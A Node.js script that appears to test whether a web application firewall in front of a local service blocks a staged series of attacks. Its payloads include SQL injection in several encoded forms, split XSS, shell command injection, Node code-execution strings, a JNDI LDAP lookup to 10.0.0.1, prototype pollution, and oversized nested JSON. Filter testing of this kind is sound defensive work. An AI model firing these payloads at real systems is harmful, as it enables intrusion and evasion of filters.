const http = require('http');
const crypto = require('crypto');

const TARGET = { host: 'localhost', port: 8081 };
const RESULTS = {
    bypassed: [],
    blocked: [],
    errors: []
};

// Configurable timing
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function sendRequest(path, method = 'GET', body = null, headers = {}) {
    const start = Date.now();
    return new Promise((resolve) => {
        const req = http.request({
            ...TARGET, path, method, headers: { ...headers, 'Connection': 'keep-alive' }
        }, (res) => {
            let data = '';
            res.on('data', c => data += c);
            res.on('end', () => {
                resolve({ status: res.statusCode, data, latency: Date.now() - start });
            });
        });
        req.on('error', (e) => resolve({ status: e.code || 'ERROR', data: e.message, latency: Date.now() - start }));
        if (body) req.write(body);
        req.end();
    });
}

function logResult(phase, payload, status, latency) {
    if (status === 200) {
        RESULTS.bypassed.push({ phase, payload });
        console.log(`[❌ BYPASS] Phase: ${phase} | Status: ${status} | Payload: ${payload.substring(0, 50)}`);
    } else if (status === 403 || status === 'ECONNRESET') {
        RESULTS.blocked.push({ phase, payload });
        console.log(`[✅ BLOCKED] Phase: ${phase} | Status: ${status} | Latency: ${latency}ms`);
    } else {
        RESULTS.errors.push({ phase, payload, status });
        console.log(`[⚠️ ERROR] Phase: ${phase} | Status: ${status}`);
    }
}

async function runCampaign() {
    console.log("==========================================");
    console.log("🔥 STATEFUL ADVERSARIAL CAMPAIGN STARTED 🔥");
    console.log("==========================================");

    // --- PHASE 1: RECON ---
    console.log("\n[*] PHASE 1: RECON (Establishing Baseline)");
    let totalLatency = 0;
    for (let i = 0; i < 5; i++) {
        const res = await sendRequest('/api/health');
        totalLatency += res.latency;
        await sleep(100);
    }
    const avgLatency = totalLatency / 5;
    console.log(`[+] Baseline average latency: ${avgLatency}ms`);

    // --- PHASE 2: PROBING ---
    console.log("\n[*] PHASE 2: PROBING (Low Signal Detection)");
    const probes = ["union", "select", "1=1", "script", "alert"];
    for (const p of probes) {
        const res = await sendRequest(`/vuln/sqli?q=${p}`);
        logResult('Probing', p, res.status, res.latency);
        await sleep(200); // Fly under the radar
    }

    // --- PHASE 3: PAYLOAD EVOLUTION ---
    console.log("\n[*] PHASE 3: PAYLOAD EVOLUTION");
    let basePayload = "1' OR 1=1--";
    let evolutions = [
        basePayload,
        encodeURIComponent(basePayload),
        `1'%20%6F%72%201=1--`, // partial hex encode
        `1'/**/OR/**/1=1--`, // inline comments
        Buffer.from(basePayload).toString('base64'), // embedded b64
        `{"q": "${Buffer.from(basePayload).toString('base64')} padding"}`, // dirty b64 in JSON
        `1' \n OR \n 1=1--` // newline obfuscation
    ];
    for (const ev of evolutions) {
        const res = await sendRequest(`/vuln/sqli?id=${encodeURIComponent(ev)}`, 'GET');
        logResult('Evolution', ev, res.status, res.latency);
        await sleep(300);
    }

    // --- PHASE 4: CROSS-REQUEST ATTACK ---
    console.log("\n[*] PHASE 4: CROSS-REQUEST ATTACK");
    // Attempting to establish state in session/backend (simulated)
    await sendRequest('/vuln/xss', 'POST', '{"part1":"<script>"}', { 'Cookie': 'sess=1' });
    await sleep(100);
    const crRes = await sendRequest('/vuln/xss', 'POST', '{"part2":"alert(1)</script>"}', { 'Cookie': 'sess=1' });
    logResult('Cross-Request', '<script>...alert(1)</script>', crRes.status, crRes.latency);

    // --- PHASE 5: CONTEXT POISONING ---
    console.log("\n[*] PHASE 5: CONTEXT POISONING");
    const cpRes = await sendRequest('/vuln/sqli', 'POST', '{"id": "1"}', { 
        'X-Malicious-Header': `this.constructor.constructor('return process')()`,
        'User-Agent': `sqlmap/1.0`,
        'Referer': `http://127.0.0.1` // SSRF trick in Referer
    });
    logResult('Context Poisoning', 'Multiple poisoned headers', cpRes.status, cpRes.latency);

    // --- PHASE 6: BEHAVIORAL EVASION ---
    console.log("\n[*] PHASE 6: BEHAVIORAL EVASION");
    for (let i = 0; i < 50; i++) {
        await sendRequest('/api/health'); // Benign traffic
    }
    const beRes = await sendRequest('/vuln/cmd', 'POST', '{"cmd":"$(whoami)"}');
    logResult('Behavioral Evasion', '$(whoami) after 50 benign', beRes.status, beRes.latency);

    // --- PHASE 8: POLYMORPHIC ---
    console.log("\n[*] PHASE 8: POLYMORPHIC ATTACKS");
    const rce = "require('child_process').exec('id')";
    for(let i=0; i<10; i++) {
        let spacer = " ".repeat(i);
        let poly = rce.replace('child_process', `child_process${spacer}`);
        const res = await sendRequest('/vuln/rce', 'POST', `{"code":"${poly}"}`);
        logResult('Polymorphic', poly, res.status, res.latency);
    }

    // --- PHASE 9: RESOURCE ATTACK ---
    console.log("\n[*] PHASE 9: RESOURCE ATTACK");
    let deepJson = { payload: "global['eval']('alert(1)')" };
    for(let i=0; i<100; i++) { deepJson = { nested: deepJson }; }
    const largePad = "A".repeat(1024 * 500); // 500KB
    deepJson.pad = largePad;
    const body = JSON.stringify(deepJson);
    const raRes = await sendRequest('/vuln/rce', 'POST', body, { 'Content-Type': 'application/json' });
    logResult('Resource Attack', 'Deep nested JSON 500KB', raRes.status, raRes.latency);

    // --- PHASE 10: FINAL CHAIN ---
    console.log("\n[*] PHASE 10: FINAL CHAIN");
    const fcReq = {
        'Cookie': 'sess=jndi:ldap://10.0.0.1/a',
        'X-Forwarded-For': '127.0.0.1.nip.io',
        'Content-Type': 'application/json'
    };
    // Send 10 benign, then 1 highly fragmented, polymorphic, large payload
    for(let i=0;i<10;i++) await sendRequest('/api/health');
    const finalBody = JSON.stringify({
        data: Buffer.from("constructor/**/prototype").toString('base64'),
        junk: "B".repeat(10000)
    });
    const fcRes = await sendRequest('/vuln/proto', 'POST', finalBody, fcReq);
    logResult('Final Chain', 'Multi-layer obfuscation', fcRes.status, fcRes.latency);

    // --- PHASE 11: SUPER-CHAIN BYPASS ---
    console.log("\n[*] PHASE 11: SUPER-CHAIN (Targeted Weakness Attack)");
    const superPayloads = [
        { name: "SQLi No-Space Bypass", path: "/vuln/sqli?id=1'OR 1=1--" },
        { name: "CMD Variable Obfuscation", path: "/vuln/cmd", method: "POST", body: '{"injected": "whoa`echo m`i"}' },
        { name: "RCE String Concat", path: "/vuln/rce", method: "POST", body: '{"code": "global[\\"ev\\" + \\"al\\"](\'console.log(1)\')"}' },
        { name: "Base64 SQLi (Direct)", path: "/vuln/sqli", method: "POST", body: `{"id": "${Buffer.from("1' OR 1=1--").toString('base64')}"}` }
    ];

    for (const p of superPayloads) {
        const url = p.path.includes('?') ? p.path.split('?')[0] + '?' + encodeURI(p.path.split('?')[1]) : p.path;
        const res = await sendRequest(url, p.method || 'GET', p.body, { 'Content-Type': 'application/json' });
        logResult('Super-Chain', p.name, res.status, res.latency);
    }

    console.log("\n==========================================");
    console.log("📊 CAMPAIGN RESULTS");
    console.log("==========================================");
    console.log(`✅ Total Blocked:  ${RESULTS.blocked.length}`);
    console.log(`❌ Total Bypasses: ${RESULTS.bypassed.length}`);
    console.log(`⚠️  Total Errors:   ${RESULTS.errors.length}`);
}

runCampaign().catch(console.error);
